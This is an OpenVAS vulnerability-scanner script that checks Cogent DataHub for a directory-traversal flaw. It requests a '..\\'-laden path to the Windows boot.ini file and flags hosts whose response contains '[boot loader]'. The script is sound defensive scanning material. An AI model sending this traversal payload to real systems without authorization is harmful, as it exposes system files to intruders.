###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cogent_datahub_49610.nasl 3116 2016-04-19 10:11:19Z benallard $
#
# Cogent DataHub Directory Traversal Vulnerability and Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Cogent DataHub is prone to a directory-traversal vulnerability, an
information-disclosure vulnerability and to multiple buffer-overflow
and integer-overflow vulnerabilities.

Exploiting the issues may allow an attacker to obtain sensitive
information that could aid in further attacks or may allow attackers
to execute arbitrary code within the context of the privileged domain.

Cogent DataHub 7.1.1.63 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(103253);
 script_version("$Revision: 3116 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:11:19 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
 script_bugtraq_id(49610,49611);
 script_cve_id("CVE-2011-3500", "CVE-2011-3501");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Cogent DataHub Multiple Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49610");
 script_xref(name : "URL" , value : "http://www.cogentdatahub.com/Products/Cogent_DataHub.html");
 script_xref(name : "URL" , value : "http://aluigi.org/mytoolz/mydown.zip");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if Cogent DataHub is prone to a directory-traversal vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = string(dir, "/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"); 

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
